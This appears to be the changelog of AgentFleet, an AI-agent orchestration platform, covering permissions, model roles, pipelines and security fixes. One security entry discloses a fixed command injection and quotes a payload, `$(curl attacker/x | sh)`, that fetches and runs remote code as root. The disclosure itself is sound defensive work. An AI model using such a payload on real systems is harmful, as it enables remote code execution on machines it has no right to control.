# Changelog

Notable changes to AgentFleet. Dates are release dates; the format is loosely
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
semantic versioning.

## [Unreleased]

Twelve commits since the 1.1.0 notes were written. Where v1.1.0 was about
several of each thing, this is about the agents producing something you can
keep, and about telling administration apart from use.

### A shared work catalog

Agents could message each other and share credentials but had nowhere to put
the work itself, so whatever one produced lived in its container and died with
it — a second bot asked to build on it had to be told what to rebuild rather
than handed the thing.

They now publish files, workspaces, and *apps*: one self-contained HTML
document each, which the phone renders and runs from a third tab in Vault. Two
new actions, `publish_work` and `read_work`, both keyed by name, because agents
refer to each other's work by what it is called. Publishing an existing name is
an edit that bumps the version.

An app runs from a string rather than a URL, so it has an opaque origin, no
cookies and no access to the app's token, and the view injects a
Content-Security-Policy that denies it any network at all. Content that is not
a web page is refused at publish time with a message telling the agent what to
do instead — a bot published a Python file as an app, and nothing had stopped
it. The publish-time scan for external references is a courtesy that catches an
honest mistake early; the policy is what actually holds, since a URL built at
runtime walks past any scan.

### API keys, and disabling people

There was no way in but a password login returning a short-lived token, so
anything automated had to be handed somebody's password. Keys are issued per
user and per purpose, carry their owner's role, record when they were last
used, and are stored only as a hash. Revoking a key, or disabling the account
it belongs to, stops it at the next request.

Accounts can now be disabled rather than deleted — deleting cascades a
person's keys away and orphans what they made — and an administrator can reset
a password, which on a deployment with no mail server is the only way back in.

### Administration is its own place

Users, departments, AI connections and API keys moved to an Admin tab that only
administrators see. They used to sit in Settings, offered to everyone, with the
server doing the refusing.

Provider connections, model combinations and per-bot fallback chains are now
admin-only, reading included. Listing was open to any signed-in user and the
mutating routes needed only operator, so someone handed a single bot to drive
could read every provider's base URL and OAuth client id and rewrite the chain
the whole fleet falls back through.

### A bot can belong to several departments

`instances.org_id` held exactly one, so a bot two teams both relied on had to be
filed under one of them and be invisible to the other. Membership is a join
table now and permission checks take the union across a bot's departments:
sharing widens who can reach a machine and never narrows it.

### Personality, voice and pace, per bot

Each bot carries its own personality, prefilled at creation from the one its
archetype ships with — which nothing had ever read, so every bot was created
with an empty one — and editable at any time. Voice speed joins voice as a
per-bot setting.

### Fixed

- **Fleet comms answered every message as a status update.** Asked to work
  together and build something, four agents each replied "I am currently idle
  and available" and nobody did anything. The prompt behind those replies was
  written to answer "what is everyone up to" and told the agent never to claim
  it had started anything. An agent now tells a request from a question, and a
  request produces a plan that starts real work.
- **Sandboxes were addressed by a pinned IP.** Docker hands out a new address
  every restart, so after a host reboot one bot pointed at a dead address — a
  500 on every desktop call — and another pointed at an address a *different*
  bot had since been given, which would have shown one agent's desktop under
  another's name. They are addressed by container alias now, and reconcile
  repairs stale addresses instead of only syncing lifecycle state.
- **The read-only desktop had never worked across a restart.** `VNCViewURL` had
  no database column at all, so it was empty after every restart and every
  auditor was refused with a message blaming the age of the instance.
- **Half of every API key issued was dead on arrival.** The key parser split on
  every underscore and the secret half is base64url, whose alphabet contains
  one.
- **`/api/orgs` returned 500 to every caller.** Two raw SQL statements still
  queried the dropped `instances.org_id`; searching for the Go field name does
  not look inside query strings. A test now reads the SQL and fails if it
  happens again.
- **A new chat opened at the bottom of its list.** Threads were ordered by last
  message and a new one has none, so making a chat put it where it was hardest
  to find.
- **A new chat made from the broadcast was not a broadcast.** It carried the
  current roster as a member list, so it grouped apart from the everyone
  channel and silently excluded every bot added afterwards.

### Changed

- The default local vision model is `qwen3.5:4b`, in `.env.example`, the
  compose default, the code fallback and the model catalogue — which still
  advertised the previous one as "Default" and did not list qwen3.5 at all.

---

## [1.1.0] — 2026-08-29

Sixty commits since v1.0.0. The theme is that v1.0.0 was built for one operator
and one bot at a time, and this release is about several of each: departments
with their own people and machines, several models with different jobs, several
conversations with the same agent, and pipelines that put several bots in a row.

It also contains a security fix that matters — a command injection reachable by
any operator who could create a bot — and a crash that could take the whole
orchestrator down.

### Organisations, departments and per-bot permissions

Access used to be three global roles, which meant every operator could see,
drive and delete every bot in the fleet and read every shared credential. That is
workable for one person and wrong for an organisation, where the questions are
"which bots" and "how much".

- **Organisations (departments)** with their own members and org roles. An org
  role answers "what does someone at this level normally do", set once per
  department.
- **Per-bot permission grants** answer "except for this one" — the contractor who
  may drive a single machine, the auditor who may read one bot's transcripts and
  nothing else. A grant wins outright, including when it is empty: that is how a
  single bot is hidden from someone who can otherwise see their whole department.
- **Watching a desktop and driving it are separate permissions**, and the
  distinction is enforced by which VNC server the connection is spliced to, not by
  a flag the client could ignore.
- **Listings are filtered, not gated.** Someone who may see two bots of twenty
  gets two. Returning all of them and hiding the rest in the client would put
  every department's bot names on the wire.
- `GET /api/me/permissions` reports a caller's effective permissions, so clients
  do not each re-derive them and disagree.
- Permission checks were then added to the routes the first pass missed, and the
  last three ungated routes were found by enumerating the router rather than
  reading it — which is the only way that ends.
- All of this is administrable from the phone app as well as the console.

### Model combinations

The philosophy document had described splitting perception from reasoning; an
audit found nothing implemented it. Every call site used the same chain, so one
model read the screen, planned, chatted and summarised.

- **Roles are real**: `vision`, `reasoning`, `chat`, `summarize`, `refine`. Each
  call site now asks for the role it is actually playing.
- **A combination** assigns models to roles. The simple form is a brain and a pair
  of hands — the split that matters most, since reading a screen and reasoning
  about it reward completely different models. The advanced form exposes every
  role, for when summarising a long thread should not cost what planning does.
- **Combinations sit in the same fallback chain as single providers**, which is
  what makes "this pair, and if neither answers, that one" expressible as one
  ordered list.
- **Vision never falls back to a role chosen for text.** A text-only model
  assigned to the hands is refused at save time with the reason, rather than
  being skipped every turn and appearing to do nothing.
- `GET /api/instances/{id}/models/resolved` shows which model would actually
  serve each role for a given bot.

### Model connections and signing in

- Manage AI connections from inside the app, with per-bot fallback chains.
- **Sign in with an account instead of pasting an API key**: OAuth 2.0
  authorization code with PKCE, where the app opens the provider's own consent
  page and the server does the exchange. The app never holds a client secret, a
  code or a token.
- A signed-in connection stores its credential under a different vault reference
  from its API key, so switching between the two does not destroy the one you are
  not currently using.
- Dropped the Vertex AI path added earlier in the cycle. It required a Google
  Cloud project rather than a subscription, which was not what it appeared to
  offer.
- The provider form now says which authentication method to pick, and offers the
  easier one first.
- Model discovery no longer strands a connection on every rejected key.
- Reasoning models no longer fail the Ollama health probe by spending their
  budget on a hidden thinking pass and returning nothing.

### Conversations, chat sessions and sender identity

- **Conversations are objects** you create and delete, rather than threads
  inferred from who happened to message whom. Direct with one bot, a pair of bots
  you watch, or a group. An unfiled message from an agent that knows nothing
  about conversations is placed by its recipient, so agent-to-agent chatter lands
  in its own thread rather than the fleet channel.
- **Threads can be compacted**: a long history folds into one summary message
  through the `summarize` role. The originals stay in the database and stop being
  replayed. A failed or empty summary leaves the thread untouched, because losing
  history to a model call is the one outcome compaction must never have.
- **Per-bot named chat sessions**, which can be started, renamed, pinned and
  deleted. Each is its own context: the history replayed into the model is scoped
  to the open chat, so a chat you deliberately started clean stays clean. Messages
  from before the migration keep a null session and appear as "Earlier chat".
- **Agents know who is speaking.** Every human turn used to arrive with no
  attribution, so an agent could not tell one colleague from another or notice
  that whoever is asking now is not who set the task. Chat and peer messages now
  carry their sender.
- **Memories can be about a person**, attributed to them rather than to the world,
  and returned only when that person next talks to that bot. What one agent
  learned about a colleague is not every agent's to know. The prompt tells the
  agent not to recite them, and not to guess at people — only to record what it
  was told or plainly shown.
- **Per-bot memory namespaces.** One shared pool meant every agent recalled every
  other agent's notes, so a finding about one machine came back as guidance to an
  unrelated bot mid-task. What a bot has kept is now visible in the app and can be
  forgotten one entry at a time.
- Agents stopped answering old messages, summaries, and rooms they are not in.
- Several chats with the same people no longer rename each other, and the
  broadcast channel can be renamed and pinned like any other.
- A bot can propose a plan and wait for approval instead of acting immediately.

### Pipelines and triggers

- **DAG pipelines that actually run.** Running a real three-bot pipeline turned up
  four faults, each of which made the feature look like it worked. Execution
  walked the node list in declaration order and ignored the edges, so what was
  stored as a graph ran as a list. Nothing ran at all: each node slept 500ms and
  recorded a fixed success string, so a run could not fail. Nothing was validated,
  so a graph with a cycle or an edge pointing at a node that does not exist was
  accepted with a 200. And a run did not survive a restart.

  Nodes are now topologically ordered, dispatched through the same trigger
  dispatcher that webhooks and cron use, and a failing node fails the pipeline
  rather than handing the next node a dependency that never produced anything.
  Invalid graphs are refused at save with the reason, because a pipeline is
  written once and run on a schedule.

  Note what is still not implemented: nodes run **one at a time**, and edge
  conditions are stored but not evaluated. The UI used to promise otherwise; that
  copy has been corrected.
- **Real webhook dispatch and a cron scheduler**, both persisted and reloaded at
  start, with a guarded claim so a trigger cannot double-fire. Cron expressions
  that will not parse are rejected when created rather than silently never firing.
- A task waiting on a human can now be cancelled. Previously it could not be
  cancelled at all, ever, and sat in `awaiting_human` with nothing able to move
  it.

### Tools and archetypes

- **Choose which of an archetype's tools to install, and add your own.** An
  archetype's tool list used to be all-or-nothing and fixed. A custom tool carries
  how to fetch it: apt, pip, npm, `go install`, a downloaded binary, or a
  repository cloned into the workspace. Operator recipes are consulted before the
  built-in file, so an addition behaves exactly like a built-in one and can
  override it.
- Names and specifications are validated against an allowlist before anything is
  provisioned, because these values reach a shell inside the sandbox. Refusing at
  the door beats sanitising deep in a script.
- **Archetypes install what their templates promise, and claim only what landed.**
  The templates declare tools aspirationally; the orchestrator now reconciles the
  agent's prompt against what actually installed, so a model is not told it has
  Ghidra when it does not.
- A tool with no recipe no longer abandons the whole initialiser, leaving every
  later tool uninstalled.

### Perception

- **Support for vision models that answer in normalised coordinates**, and then
  **automatic calibration of each model's convention.** There is no way to ask a
  model which convention it uses, and prompting does not change it — measured
  against one model, the reply was byte-identical whether the prompt said nothing,
  stated the pixel range, or included a worked example. The agent now shows the
  model one frame whose layout it cannot know in advance, reads the convention off
  the answer, and caches it.
- Set-of-Marks was calling an accessibility function that has never existed.

### Desktop, voice and the phone app

- **Real speech from a CPU sidecar**, with a voice per agent and a picker in the
  app.
- **Takeover on Linux and Windows**, first through the system browser and then
  embedded in the page with CEF. Depending on the system browser proved fragile:
  on one machine the default handler pointed at a browser sitting behind an
  unaccepted first-run dialog, so takeover opened nothing and explained nothing.
- noVNC's own assets are now served through the proxy, so the viewer loads inside
  the app rather than showing a blank frame.
- Real full-screen, and no double title bar.
- The phone app gained provisioning, host usage, agent-to-agent messaging, a DAG
  view, and its own icon, splash and name. The Voice and Swarm tabs were dropped.
- Idle agents answer messages instead of ignoring them until given a task.

### Security

- **Command injection through `preinstalled_tools` (critical).** Provisioning
  verified a bot's toolchain by writing each tool name into a bash script with
  Go's `%q`, which produces a *double*-quoted string — and bash expands `$(...)`
  and backticks inside double quotes. A tool name of `$(curl attacker/x | sh)` in
  a create-instance request ran as root inside the sandbox. Reachable by any
  operator permitted to create a bot in one organisation, which under the new
  RBAC can be an ordinary member. Confirmed by exploit against a running server.
  Now single-quoted, with the awkward case — the quote character itself — closed
  and reopened around an escape. The tests run the real shell rather than
  asserting on the quoted string, because the claim being made is about what bash
  does with it.

- **A build that hid the fix.** Worth recording separately. Upgrading
  dependencies raised `go.mod` to Go 1.25 while the Dockerfile still built on
  1.23, so every image build had been failing at `go mod download` — and Compose
  carried on running the previous image while the deploy printed "Started". Four
  deploys reported success and shipped nothing. The build image is bumped, and
  the deployed binary was checked for the fix rather than assumed.

- **A fatal concurrent-map crash that could kill the orchestrator.** A pipeline
  run carries its node results in a map, and both the trigger and list paths
  handed the struct out by value — sharing that map with the goroutine still
  executing the pipeline. The API then serialised it while a node wrote to it. A
  concurrent map access is a fatal runtime error, not a recoverable one, so
  refreshing the pipelines screen during a run could take the whole orchestrator
  down. Runs now leave the engine as snapshots.

- **Three dependency vulnerabilities, `govulncheck` from three reachable to
  none.** pgx 5.7.1 to 5.9.2, which carried a SQL injection through placeholder
  confusion with dollar-quoted literals, plus `golang-jwt` and `x/text`.

- **The set-role route stored any string as a role.** Creating a user validated
  the role; changing one did not. An unrecognised role ranks below every gate, so
  writing one locked the account out of the entire API — and the request answered
  204, so it read as success. Aiming the same call at a user ID that does not
  exist also answered 204, because an UPDATE matching no rows is not an error to
  the driver. *(Found and fixed during the audit pass. The validation change
  landed inside commit `7abc2c0`, whose stated purpose was a comms UI change;
  `0edf888` added the tests and the missing-user case.)*

- **`ExecAs` did not check the Docker exec-start status.** The engine's own error
  body was demultiplexed and returned as though it were the command's stdout,
  with a nil error, so a caller probing a paused container was told the probe had
  run and printed something. *(Also from the audit pass, and also landed inside
  commit `7abc2c0` rather than in a commit of its own.)*

### Sandbox

- Snapshots archived a directory the agent never uses.
- The keyring's 204 replies put a body on the wire.
- Sudo can be changed on a running instance rather than requiring the container
  to be recreated. This is a deliberate trade: `no-new-privileges` is the stronger
  control but the kernel fixes it at container creation, which meant revoking sudo
  meant destroying the agent's workspace — at exactly the moment that costs most.
  Sudo is gated by the setuid bit on `/usr/bin/sudo` instead. What is lost is the
  kernel-level backstop against a bug in sudo or another setuid binary. See
  [docs/SECURITY.md](docs/SECURITY.md).

### Reliability in the app

- The vault screen hid its own spinner and errors behind stale state.
- Recording controls could call `setState` on a disposed screen.
- Deleting a shared secret sent no credentials and reported success anyway.
- The invisible-error bug was found in three more sheets.
- The API returns empty arrays rather than null, and reports the socket as
  connected when it is.

### Documentation

The documentation was rewritten against the code for this release; several
documents had described things that were never built. See
[docs/RELEASE_NOTES_v1.1.0.md](docs/RELEASE_NOTES_v1.1.0.md) and the README's
"What is partly built" section.

---

## [1.0.0] — 2026-08-28

First public release. Sandboxed Linux desktops on Docker with cgroup limits and
nftables egress policy; a perceive-decide-act agent loop over a fallback chain of
model providers; teaching by demonstration compiled into `SKILL.md`; escalation
to a human on a stalled screen; an AES-256-GCM credential vault; a React admin
console and a Flutter companion app.

[1.1.0]: https://github.com/BryantVanOrden/AgentFleet/compare/v1.0.0...v1.1.0
[1.0.0]: https://github.com/BryantVanOrden/AgentFleet/releases/tag/v1.0.0
